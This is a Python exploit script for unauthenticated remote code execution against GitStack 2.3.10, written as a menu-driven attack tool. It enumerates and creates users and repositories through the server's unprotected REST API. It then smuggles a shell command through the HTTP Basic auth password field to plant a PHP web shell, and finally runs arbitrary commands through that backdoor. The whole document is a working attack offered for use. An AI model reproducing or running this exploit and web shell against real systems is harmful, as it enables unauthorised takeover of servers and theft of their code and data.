# Exploit: GitStack 2.3.10 Unauthenticated Remote Code Execution
# Date: 04.08.2023
# Software Link: https://gitstack.com/
# Exploit Author: LordOfTheIoT
# Contact: lord_of_the_iot@protonme or discord @LordOfTheIoT
# Category: remote

import requests
from requests.auth import HTTPBasicAuth
import time
import os
import sys

server = str()

def get_user_list():
	print("[*] retrieving user list")
	try:
		user_list = requests.get(f"{server}/rest/user/").json()
		user_list.remove('everyone')
		for user in user_list:
			print(f"    [+] found user {user}")
	except:
		pass

def create_user():
	print("[*] adding user")
	username = input("    enter username for new user>")
	password = input("    enter password for new user>")
	creation_info = requests.post(f"{server}/rest/user/", data={'username' : username, 'password' : password}).text
	if not "User created" in creation_info and not "User already exist" in creation_info:
		print("[-] unable to create user")
	else:
		print(f"[+] user {username} created wih password {password}")

def enable_web_repo():
	print("[*] enabling web repository")
	web_repo = requests.get(f"{server}/rest/settings/general/webinterface/").text
	if "true" in web_repo:
		print("[+] web repository already enabled")
	else:
		web_repo = requests.put(f"http://{server}/rest/settings/general/webinterface/", data='{"enabled" : "true"}').text
		if not "Web interface successfully enabled" in web_repo:
			print("[-] unable to enable web interface")
		else:
			print("[+] enabled web repository")

def get_repo_list():
		print("[*] retrieving repositories list")
		repository_list = requests.get(f"{server}/rest/repository/").json()

		if len(repository_list) > 0:
			for repository in repository_list:
				print(f"    [+] Found repository {repository['name']}")
		else:
			print("[-] no repositories found")

def create_repo():
	print("[*] creating repository")
	repo_name = input("    enter name of repository to be created>")
	csrf_token = input("    enter token for access to server>")
	repo_req = requests.post(f"{server}/rest/repository/", cookies={'csrftoken' : csrf_token}, data={'name' : repo_name, 'csrfmiddlewaretoken' : csrf_token})
	if not "The repository has been successfully created" in repo_req and not "Repository already exist" in repo_req:
		print("[-] Cannot create repository")
	else:
		print("[+] repo created")

def add_repo_user():
	print("[*] adding user to repository")
	repository = input("    enter name of the repository for the user to be added to>")
	username = input("    enter name of the user>")
	response =  requests.post(f"{server}/rest/repository/{repository}/user/{username}/").text

	if not "added to" in response and not "has already" in response:
		print("[-] unable to add user to repository")
	else:
		print("[+] added user to repository")

def disable_access():
	print("[*] disabling access to repo for anyone")
	repository = input("    enter name of the repository for accessed to be removed>")
	response = requests.delete(f"{server}/rest/repository/{repository}/user/everyone/").text
	if not "everyone removed from rce" in response and not "not in list" in response:
		print("[-] cannot remove access for anyone")
	else:
		print(f"[+] access removed to {repository} for everyone")


def php_backdoor():
	print("[*] creating a backdoor in PHP")
	repository = input("    enter name of the repository for shell to be uploaded to>")
	username = input("    enter username for shell to be uploaded under>")
	password = input("    enter password of the specified user>")
	response = requests.get(f"{server}/web/index.php?p={repository}.git&a=summary", auth=HTTPBasicAuth(username, f'{password} && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit.php')).text
	if "Your GitStack credentials were not entered correcly" in response:
		print("[-] unable to upload PHP backdoor")
	else:
		print("[+] PHP backdoor uploaded")

def shell():
	try:
		while True:
			print(requests.post(f"{server}/web/exploit.php", data={'a' : input(">")}).text.lstrip('""').rstrip('" \r\n'))
	except KeyboardInterrupt:
		pass

if __name__ == "__main__":
	server = sys.argv[1]
	while True:
		os.system("clear")
		print("GitStack 2.3.10 Unauthenticated Remote Code Execution")
		print("written by LordOfTheIoT")
		print("based off of https://www.exploit-db.com/exploits/43777")
		print(f"\nserver: {server}\n\n")
		print("  options:")
		print("    [1]  get list of users")
		print("    [2]  create user")
		print("    [3]  enable web repository")
		print("    [4]  get list of repositories")
		print("    [5]  create a repository")
		print("    [6]  add user to a repository")
		print("    [7]  disable access a a repository")
		print("    [8]  upload a php backdoor")
		print("    [9]  shell with the php backdoor")
		choice = input("        >").strip()
		if choice == "1":
			get_user_list()
		elif choice == "2":
			create_user()
		elif choice == "3":
			enable_web_repo()
		elif choice == "4":
			get_repo_list()
		elif choice == "5":
			create_repo()
		elif choice == "6":
			add_repo_user()
		elif choice == "7":
			disable_access()
		elif choice == "8":
			php_backdoor()
		elif choice == "9":
			shell()
		else:
			print("[!] invalid choice")
			time.sleep(3)
			continue
		input()
